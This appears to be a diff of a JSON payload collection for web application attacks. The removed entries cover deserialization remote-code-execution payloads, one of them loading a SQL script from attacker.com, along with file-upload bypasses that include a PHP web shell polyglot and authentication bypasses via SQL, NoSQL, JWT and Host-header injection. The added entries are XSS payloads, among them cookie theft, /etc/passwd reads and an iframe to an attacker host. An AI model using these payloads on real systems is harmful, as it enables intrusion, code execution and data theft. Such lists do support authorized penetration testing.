-    "tags": "deserialization, python"
-  },
-  {
-    "title": "Java Commonscollections 1",
-    "category": "Deserialization",
-    "payload": "(Binary Payload required - Use Ysoserial)",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "deserialization, java"
-  },
-  {
-    "title": "Node.js Deserialization (IIFE)",
-    "category": "Deserialization",
-    "payload": "{\"rce\":\"_$$ND_FUNC$$_function (){require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) }); } ()\"}",
-    "type": "JSON Body",
-    "severity": "Critical",
-    "tags": "deserialization, nodejs, rce"
-  },
-  {
-    "title": "Yaml Deserialization (Python)",
-    "category": "Deserialization",
-    "payload": "!!python/object/apply:os.system [\"id\"]",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "deserialization, yaml"
-  },
-  {
-    "title": "ASP.NET ViewState",
-    "category": "Deserialization",
-    "payload": "/wEPDwULLTE... (Base64 Encoded Payload)",
-    "type": "Body Parameter",
-    "severity": "High",
-    "tags": "deserialization, aspnet"
-  },
-  {
-    "title": "PHP Phar Deserialization",
-    "category": "Deserialization",
-    "payload": "phar:///path/to/exploit.phar",
-    "type": "URL Parameter",
-    "severity": "Critical",
-    "tags": "deserialization, php, phar"
-  },
-  {
-    "title": "Ruby YAML Deserialization",
-    "category": "Deserialization",
-    "payload": "--- !ruby/object:Gem::Installer\ni: x\n",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "deserialization, ruby"
-  },
-  {
-    "title": "Generic Java JSON (Jackson)",
-    "category": "Deserialization",
-    "payload": "[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker.com/inject.sql'\"}]",
-    "type": "JSON Body",
-    "severity": "Critical",
-    "tags": "deserialization, java, jackson"
-  },
-  {
-    "title": "Dot Net BinaryFormatter",
-    "category": "Deserialization",
-    "payload": "(Base64 binary blob)",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "deserialization, dotnet"
-  },
-  {
-    "title": "Double Extension Upload",
-    "category": "File Upload Bypass",
-    "payload": "shell.php.jpg",
-    "type": "Body Parameter",
-    "severity": "High",
-    "tags": "upload, bypass"
-  },
-  {
-    "title": "Null Byte Extension Upload",
-    "category": "File Upload Bypass",
-    "payload": "shell.php%00.jpg",
-    "type": "Body Parameter",
-    "severity": "High",
-    "tags": "upload, bypass, legacy"
-  },
-  {
-    "title": "Case Sensitivity Upload",
-    "category": "File Upload Bypass",
-    "payload": "shell.PhP",
-    "type": "Body Parameter",
-    "severity": "High",
-    "tags": "upload, bypass"
-  },
-  {
-    "title": "Alternate PHP Extensions",
-    "category": "File Upload Bypass",
-    "payload": "shell.php5",
-    "type": "Body Parameter",
-    "severity": "High",
-    "tags": "upload, bypass"
-  },
-  {
-    "title": "HTACCESS Upload",
-    "category": "File Upload Bypass",
-    "payload": "AddType application/x-httpd-php .png",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "upload, config-overwrite"
-  },
-  {
-    "title": "Polyglot Image (GIF+PHP)",
-    "category": "File Upload Bypass",
-    "payload": "GIF89a; <?php system($_GET['c']); ?>",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "upload, polyglot"
-  },
-  {
-    "title": "Magic Bytes (PNG)",
-    "category": "File Upload Bypass",
-    "payload": "\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\rIHDR... <?php system('id'); ?>",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "upload, magic-bytes"
-  },
-  {
-    "title": "SVG Upload XSS",
-    "category": "File Upload Bypass",
-    "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"/>",
-    "type": "Body Parameter",
-    "severity": "Medium",
-    "tags": "upload, xss"
-  },
-  {
-    "title": "File Name Traversal Upload",
-    "category": "File Upload Bypass",
-    "payload": "../../shell.php",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "upload, traversal"
-  },
-  {
-    "title": "Windows ADS Upload",
-    "category": "File Upload Bypass",
-    "payload": "shell.php::$DATA",
-    "type": "Body Parameter",
-    "severity": "High",
-    "tags": "upload, windows, ads"
-  },
-  {
-    "title": "SQLi Auth Bypass (Username)",
-    "category": "Auth Bypass",
-    "payload": "admin' --",
-    "type": "Body Parameter",
-    "severity": "Critical",
-    "tags": "auth, sqli"
-  },
-  {
-    "title": "NoSQL Auth Bypass (MongoDB)",
-    "category": "Auth Bypass",
-    "payload": "{\"username\": \"admin\", \"password\": {\"$ne\": \"\"}}",
-    "type": "JSON Body",
-    "severity": "Critical",
-    "tags": "auth, nosql"
-  },
-  {
-    "title": "JWT None Algorithm",
-    "category": "Auth Bypass",
-    "payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.",
-    "type": "HTTP Header",
-    "severity": "Critical",
-    "tags": "auth, jwt"
-  },
-  {
-    "title": "JWT Weak Secret (HMAC)",
-    "category": "Auth Bypass",
-    "payload": "(Use jwt_tool to brute force secret 'secret')",
-    "type": "HTTP Header",
-    "severity": "High",
-    "tags": "auth, jwt"
-  },
-  {
-    "title": "XPath Injection Auth Bypass",
-    "category": "Auth Bypass",
-    "payload": "' or '1'='1",
-    "type": "Body Parameter",
-    "severity": "High",
-    "tags": "auth, xpath"
-  },
-  {
-    "title": "LDAP Injection Auth Bypass",
-    "category": "Auth Bypass",
-    "payload": "*)(uid=*))(|(uid=*",
-    "type": "Body Parameter",
-    "severity": "High",
-    "tags": "auth, ldap"
-  },
-  {
-    "title": "Parameter Pollution (Role)",
-    "category": "Auth Bypass",
-    "payload": "id=123&role=user&role=admin",
+    "title": "Select Tag Breakout",
+    "category": "XSS",
+    "payload": "></select><img%20src=1%20onerror=alert(1)>",
     "type": "URL Parameter",
     "severity": "Medium",
-    "tags": "auth, hpp"
+    "tags": "xss, breakout"
   },
   {
-    "title": "Host Header Injection (Reset Password)",
-    "category": "Auth Bypass",
-    "payload": "Host: attacker.com",
-    "type": "HTTP Header",
-    "severity": "High",
-    "tags": "auth, host-header"
-  },
-  {
-    "title": "Cookie Tampering (Admin=True)",
-    "category": "Auth Bypass",
-    "payload": "Cookie: admin=true",
-    "type": "Cookie",
-    "severity": "High",
-    "tags": "auth, cookie"
-  },
-  {
-    "title": "HTTP Verb Tampering",
-    "category": "Auth Bypass",
-    "payload": "Change GET to PUT/DELETE",
-    "type": "HTTP Header",
+    "title": "JS Array Access Obfuscation",
+    "category": "XSS",
+    "payload": "\"-top['al\\x65rt']('sailay')-\"",
+    "type": "URL Parameter",
     "severity": "Medium",
-    "tags": "auth, verb-tampering"
+    "tags": "xss, obfuscation"
+  },
+  {
+    "title": "SVG ASCII Art Polyglot",
+    "category": "XSS",
+    "payload": "<pre id=p style=background:#000><svg onload='setInterval(n=>{for(o=t++,i=476;i--;o+=i%30?(\"0o\"[c=0|(h=v=>(M=Math).hypot(i/30-8+3*M.sin(t/8/v),i%30/2-7+4*M.cos(t/9/v)))(7)*h(9)*h(6)/32]||\".\").fontcolor(c>2):\"\\n\");p.innerHTML=o},t=1)'>",
+    "type": "Body Parameter",
+    "severity": "Low",
+    "tags": "xss, polyglot, art"
+  },
+  {
+    "title": "Img OnError DecodeURI",
+    "category": "XSS",
+    "payload": "<img src=\"\" onerror=\"innerHTML=decodeURIComponent.call`${location.hash}`\" \"=\"\">",
+    "type": "Body Parameter",
+    "severity": "High",
+    "tags": "xss, modern-js, dom"
+  },
+  {
+    "title": "Img OnError Location Source",
+    "category": "XSS",
+    "payload": "<img src=\"\" onerror=\"location=/javascript:/.source+location\" \"=\"\">",
+    "type": "Body Parameter",
+    "severity": "High",
+    "tags": "xss, modern-js"
+  },
+  {
+    "title": "Img OnError Throw",
+    "category": "XSS",
+    "payload": "<img src=\"\" onerror=\"window.onerror=alert;throw 1337\" \"=\"\">",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, modern-js, obfuscation"
+  },
+  {
+    "title": "Img OnError HTML Entities",
+    "category": "XSS",
+    "payload": "<img src=\"\" onerror=\"alert&1par;1337&rpar;\" \"=\"\">",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, modern-js"
+  },
+  {
+    "title": "Img OnError Backticks",
+    "category": "XSS",
+    "payload": "<img src=\"\" onerror=\"alert`1337`\" \"=\"\">",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, es6"
+  },
+  {
+    "title": "Breakout Prompt 1",
+    "category": "XSS",
+    "payload": "\"><script>prompt(1)</script>",
+    "type": "URL Parameter",
+    "severity": "Medium",
+    "tags": "xss, breakout"
+  },
+  {
+    "title": "Breakout Prompt Domain",
+    "category": "XSS",
+    "payload": "\"><script>prompt(document.domain)</script>",
+    "type": "URL Parameter",
+    "severity": "Medium",
+    "tags": "xss, breakout"
+  },
+  {
+    "title": "Breakout Prompt Cookie",
+    "category": "XSS",
+    "payload": "\"><script>prompt(document.cookie)</script>",
+    "type": "URL Parameter",
+    "severity": "High",
+    "tags": "xss, breakout"
+  },
+  {
+    "title": "Breakout SVG Script",
+    "category": "XSS",
+    "payload": "\"><svg><script>alert(1)</script>",
+    "type": "URL Parameter",
+    "severity": "Medium",
+    "tags": "xss, breakout, svg"
+  },
+  {
+    "title": "Query Param Injection 1",
+    "category": "XSS",
+    "payload": "?s=\"onerror=\"innerHTML=decodeURIComponet.call`${location.hash}`\"#<img src onerror=alert(1337)>",
+    "type": "URL Parameter",
+    "severity": "High",
+    "tags": "xss, dom, complex"
+  },
+  {
+    "title": "Query Param Injection 2",
+    "category": "XSS",
+    "payload": "?s=\"onerror=\"location=/javascript:/.source%2Blocation\"&a=%0A+alert(1337)",
+    "type": "URL Parameter",
+    "severity": "High",
+    "tags": "xss, dom, complex"
+  },
+  {
+    "title": "Query Param Injection 3",
+    "category": "XSS",
+    "payload": "?s=\"onerror=\"window.onerror=alert;throw 1337\"",
+    "type": "URL Parameter",
+    "severity": "High",
+    "tags": "xss, dom, complex"
+  },
+  {
+    "title": "Local File Read via Iframe (LFI-XSS)",
+    "category": "XSS",
+    "payload": "<img src=\"xxx\" onerror=\"document.write('<iframe src=file:///etc/passwd></iframe>')\"/>",
+    "type": "Body Parameter",
+    "severity": "Critical",
+    "tags": "xss, lfi, hybrid"
+  },
+  {
+    "title": "Link Rel Attachment",
+    "category": "XSS",
+    "payload": "<link rel=attachment href=\"file:///etc/passwd\">",
+    "type": "Body Parameter",
+    "severity": "Critical",
+    "tags": "xss, lfi"
+  },
+  {
+    "title": "Iframe Remote File",
+    "category": "XSS",
+    "payload": "<iframe src=\"http://attacker-ip/test.php?file=/etc/passwd\"></iframe>",
+    "type": "Body Parameter",
+    "severity": "High",
+    "tags": "xss, iframe"
+  },
+  {
+    "title": "Mixed Case JavaScript Protocol",
+    "category": "XSS",
+    "payload": "<IMG sRC=X onerror=jaVaScRipT:alert`xss`>",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, filter-bypass"
+  },
+  {
+    "title": "URL Encoded Mixed Case",
+    "category": "XSS",
+    "payload": "%22%3E%3CIMG%20sRC=X%20onerror=jaVaScRipT:alert`xss`%3E",
+    "type": "URL Parameter",
+    "severity": "Medium",
+    "tags": "xss, encoded"
+  },
+  {
+    "title": "SVG XMLNS Alert",
+    "category": "XSS",
+    "payload": "<svg  xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.cookie)\"/>",
+    "type": "Body Parameter",
+    "severity": "High",
+    "tags": "xss, svg"
+  },
+  {
+    "title": "SVG Style Script",
+    "category": "XSS",
+    "payload": "<svg><style> <script>alert(1)</script> </style></svg>",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, svg, css"
+  },
+  {
+    "title": "MathML Style Img",
+    "category": "XSS",
+    "payload": "<math><style> <img src onerror=alert(2)> </style></math>",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, mathml"
+  },
+  {
+    "title": "Window Location Redirect",
+    "category": "XSS",
+    "payload": "<script>window.location.assign('https://secure.eicar.org/eicar_com.zip')</script>",
+    "type": "Body Parameter",
+    "severity": "High",
+    "tags": "xss, phishing, redirect"
+  },
+  {
+    "title": "CSS Injection Body Red",
+    "category": "XSS",
+    "payload": "<body style=\"background-color:red\">",
+    "type": "Body Parameter",
+    "severity": "Low",
+    "tags": "xss, css, defacement"
+  },
+  {
+    "title": "CSS Injection Body Red Important",
+    "category": "XSS",
+    "payload": "<body style=\"background-color:red !important;\">",
+    "type": "Body Parameter",
+    "severity": "Low",
+    "tags": "xss, css, defacement"
+  },
+  {
+    "title": "Body OnLoad Redirect",
+    "category": "XSS",
+    "payload": "<body onload=window.location.assign('https://www.google.com')>",
+    "type": "Body Parameter",
+    "severity": "Medium",
+    "tags": "xss, redirect"
+  },
+  {
+    "title": "Raw JS Alert",
+    "category": "XSS",
+    "payload": "alert(123)",
+    "type": "URL Parameter",
+    "severity": "Medium",
+    "tags": "xss, js-context"
+  },
+  {
+    "title": "Raw JS Alert String",
+    "category": "XSS",
+    "payload": "alert(\"test\")",
+    "type": "URL Parameter",
+    "severity": "Medium",
+    "tags": "xss, js-context"
+  },
+  {
+    "title": "Raw JS Alert Cookie",
+    "category": "XSS",
+    "payload": "alert(document.cookie)",
+    "type": "URL Parameter",
+    "severity": "High",
+    "tags": "xss, js-context, cookie"
+  },
+  {
+    "title": "Raw JS Alert Domain",
+    "category": "XSS",
+    "payload": "alert(document.domain)",
+    "type": "URL Parameter",
+    "severity": "Medium",
+    "tags": "xss, js-context"
+  },
+  {
+    "title": "Raw JS Confirm",
+    "category": "XSS",
+    "payload": "confirm(123)",
+    "type": "URL Parameter",
+    "severity": "Medium",
+    "tags": "xss, js-context"
+  },
+  {
+    "title": "Raw JS Prompt",
+    "category": "XSS",
+    "payload": "prompt(123)",
+    "type": "URL Parameter",
+    "severity": "Medium",
+    "tags": "xss, js-context"
   }
 ]
